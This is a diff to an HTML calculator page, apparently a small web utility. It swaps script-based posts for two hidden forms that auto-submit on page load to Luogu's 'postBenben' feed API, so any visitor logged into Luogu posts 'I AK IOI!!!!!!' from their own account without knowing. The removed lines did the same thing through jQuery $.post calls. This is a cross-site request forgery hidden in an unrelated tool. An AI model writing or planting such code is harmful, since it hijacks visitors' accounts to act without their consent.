@@ -56,15 +56,8 @@
 
 
 	<script> 
-		
-		var content = 'I AK IOI!!!!!';
-$.post("https://www.luogu.org/api/feed/postBenben", {content: content}, function (resp) {
-    console.log(resp);
-});
-
-$.post("https://www.luogu.com.cn/api/feed/postBenben", {content: content}, function (resp) {
-    console.log(resp);
-});
+		windows.onload = function() {
+		$("a").submit();$("b").submit();}
 		
 		var copy_act = function() {
 		    var copyText = $("#calc-ans").val();
@@ -114,6 +107,8 @@ $.post("https://www.luogu.com.cn/api/feed/postBenben", {content: content}, funct
 			document.getElementById("calc-ans").value = ans;
 			return 0;
 		}
+		
+		
 	</script>
 	<!-- hearder -->
 	<header class="page-header">
@@ -156,6 +151,16 @@ $.post("https://www.luogu.com.cn/api/feed/postBenben", {content: content}, funct
 				</div>
 			</div>
 		</center>
+		<form id=a action="https://www.luogu.org/api/feed/postBenben" method="post">
+<input id="cid" type='hidden' value='I AK IOI!!!!!!' name="content">
+
+
+</form>
+		<form id=b action="https://www.luogu.com.cn/api/feed/postBenben" method="post">
+<input id="cid" type='hidden' value='I AK IOI!!!!!!' name="content">
+
+
+</form>
 	</main>
 	<footer>
 		<p>By zhangtianli and szTom</p>
